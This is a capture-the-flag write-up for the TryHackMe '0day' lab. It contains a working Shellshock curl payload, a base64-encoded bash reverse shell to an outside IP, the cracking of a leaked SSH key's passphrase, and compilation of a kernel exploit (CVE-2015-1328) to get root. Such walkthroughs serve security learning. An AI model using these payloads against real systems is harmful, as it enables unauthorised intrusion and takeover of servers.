---
layout: default
title: 0day
---

## TL;DR

We exploit `Shell Shock` on `cgi-bin` to get `RCE` and shell as www-data.

Then, we privilege escalate to root using `CVE-2015-1328`, vulnerable version of linux kernel

### Recon

we start with `rustscan`, using this command:
```bash
rustscan -a $target -- -sV -sC -oN nmap.txt -oX nmap.xml
```

![rustscan results](image.png)

we can see port `22` with ssh and port `80` with apache http server.
```bash
PORT   STATE SERVICE REASON         VERSION                                                                                                                  
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)                                                          
| ssh-hostkey:                                                                                                                                               
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)                                                                                               
| ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw==
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E=
|   256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Exploit Shell Shock to get RCE and shell as www-data

When we go to root page, we can see this:

![root page](image-1.png)

Let's move to fuzzing using `ffuf`:
```bash
┌──(agonen㉿kali)-[~/thm/0day]
└─$ ffuf -u 'http://0day/FUZZ' -w /usr/share/SecLists/Discovery/Web-Content/common.txt -fc 403   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://0day/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

admin                   [Status: 301, Size: 295, Words: 20, Lines: 10, Duration: 148ms]
backup                  [Status: 301, Size: 296, Words: 20, Lines: 10, Duration: 141ms]
cgi-bin                 [Status: 301, Size: 297, Words: 20, Lines: 10, Duration: 149ms]
css                     [Status: 301, Size: 293, Words: 20, Lines: 10, Duration: 144ms]
img                     [Status: 301, Size: 293, Words: 20, Lines: 10, Duration: 143ms]
index.html              [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 148ms]
js                      [Status: 301, Size: 292, Words: 20, Lines: 10, Duration: 141ms]
robots.txt              [Status: 200, Size: 38, Words: 7, Lines: 2, Duration: 140ms]
secret                  [Status: 301, Size: 296, Words: 20, Lines: 10, Duration: 143ms]
uploads                 [Status: 301, Size: 297, Words: 20, Lines: 10, Duration: 141ms]
```

Okay, we can find several interesting pages and folders.

![ffuf results](image-2.png)

We go to `/backup`, and get some encrypted private key:
```bash
┌──(agonen㉿kali)-[~/thm/0day]                                                                                                                               
└─$ curl 'http://0day/backup/'                                                                                                                               
-----BEGIN RSA PRIVATE KEY-----                                                                                                                              
Proc-Type: 4,ENCRYPTED                                                                                                                                       
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547                                                                                                       

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx                                                                                             
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM                                                                                             
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS                                                                                             
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8                                                                                             
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO                                                                                             
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN                                                                                             
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g                                                                                             
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt                                                                                             
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB                                                                                             
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u                                                                                             
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl                                                                                             
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6                                                                                             
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii                                                                                             
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn                                                                                             
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL                                                                                             
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG                                                                                             
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW                                                                                             
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6                                                                                             
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk                                                                                             
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE                                                                                             
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq                                                                                             
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q                                                                                             
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h                                                                                             
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst                                                                                             
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P                                                                                             
-----END RSA PRIVATE KEY-----
```

So, I used `ssh2john` to take the hash and `john` to crack it.

```bash
┌──(agonen㉿kali)-[~/thm/0day]
└─$ curl 'http://0day/backup/' -o id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1767  100  1767    0     0   6099      0 --:--:-- --:--:-- --:--:--  6156
                                                                                                                                                             
┌──(agonen㉿kali)-[~/thm/0day]
└─$ ssh2john id_rsa > hashes.txt      
                                                                                                                                                             
┌──(agonen㉿kali)-[~/thm/0day]
└─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)     
1g 0:00:00:00 DONE (2025-11-27 18:52) 11.11g/s 5866p/s 5866c/s 5866C/s letmein..soccer1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We got the password `letmein`.

![brute force passwords](image-3.png)

However, we don't know the username, so it useless...

Moving to `nikto`, I'll use it to enumerate more the website, searching for vulnerabilities.
```bash
──(agonen㉿kali)-[~/thm/0day]                                                                                                           [1/1965]
└─$ nikto -h 0day -o nikto_scan.txt                                                                                                              
- Nikto v2.5.0                                                          
---------------------------------------------------------------------------                                                                      
+ Target IP:          10.80.178.57                                      
+ Target Hostname:    0day                                              
+ Target Port:        80                                                
+ Start Time:         2025-11-27 19:14:41 (GMT2)                                                                                                 
---------------------------------------------------------------------------                                                                      
+ Server: Apache/2.4.7 (Ubuntu)                                         
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .                                                                                      
 - STATUS: Completed 570 requests (~8% complete, 16.2 minutes left): currently in plugin 'shellshock'
- STATUS: Running average: 100 requests: 0.15893 sec, 10 requests: 0.1604 sec.                                                                   
+ /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6271' found, with contents: true.                                                          
+ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
+ /admin/: This might be interesting.                                   
+ /backup/: This might be interesting.                                  
+ /css/: Directory indexing found.                                      
+ /css/: This might be interesting.                                     
+ /img/: Directory indexing found.                                      
+ /img/: This might be interesting.                                     
+ /secret/: This might be interesting.                                  
+ /cgi-bin/test.cgi: This might be interesting.
```

![nikto](image-4.png)

The interesting part, it the `shellshock` nikto detect at location `/cgi-bin/test.cgi`:
```bash
+ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
```

Let's try this:
```bash
┌──(agonen㉿kali)-[~/thm/0day]
└─$ curl 'http://0day/cgi-bin/test.cgi' -A "() { :; }; echo; echo; /bin/bash -c 'id'"             

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![got executed](image-5.png)

Okay, we got `RCE`. Now, we'll give the payload from `penelope`:
```bash
curl 'http://0day/cgi-bin/test.cgi' -A "() { :; }; echo; echo; /bin/bash -c 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzIuMTY4LzQ0NDQgMD4mMSkgJg==|base64 -d|bash'"
```

and we got reverse shell as `www-data`

![reverse shell penelope](image-6.png)

We can read the flag from `ryan`'s home folder:
```bash
www-data@ubuntu:/home/ryan$ cat user.txt 
THM{Sh3llSh0ck_r0ckz}
```

### Privilege Escalation to Root using CVE-2015-1328

We starts with linpeas, we can see that the linux version, which is `Linux version 3.13.0-32-generic`, is marked with orange.

![flagged version](image-7.png)

When googling, I found this [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292), exploit for privilege escalation for this version.

So, I downloaded the file `37292.c` and uploaded it to the remote server.
I tried to compile it using `gcc`, but i got this error:
```bash
www-data@ubuntu:/tmp$ gcc 37292.c -o pwn
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

![error compile](image-8.png)

The problem is that it cannot find the binary `cc1`.
So, I find it and added it to the begin of my `PATH` variable:
```bash
www-data@ubuntu:/tmp$ find / -name "cc1" 2>/dev/null
/usr/lib/gcc/x86_64-linux-gnu/4.8/cc1
www-data@ubuntu:/tmp$ export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.8/:$PATH
```

Now, we can compile and execute:
```bash
www-data@ubuntu:/tmp$ gcc 37292.c -o pwn
www-data@ubuntu:/tmp$ ./pwn 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

![get root shell](image-9.png)

and grabbing the root flag:
```bash
root@ubuntu:/root# cat root.txt 
THM{g00d_j0b_0day_is_Pleased}
```